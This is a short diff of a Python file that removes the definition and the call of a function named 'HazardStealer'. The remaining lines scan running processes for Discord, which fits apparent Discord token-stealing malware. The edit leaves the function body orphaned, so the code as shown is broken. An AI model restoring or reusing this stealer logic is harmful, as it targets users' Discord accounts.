@@ -217,7 +217,6 @@ def main():
 	except:
 		pass
 
-def HazardStealer():
 	for proc in psutil.process_iter():
 		if any(procstr in proc.name() for procstr in\
 			['discord', 'Discord', 'DISCORD',]):
@@ -246,4 +245,3 @@ def HazardStealer():
 
 if __name__ == "__main__":
 	main()
-	HazardStealer()
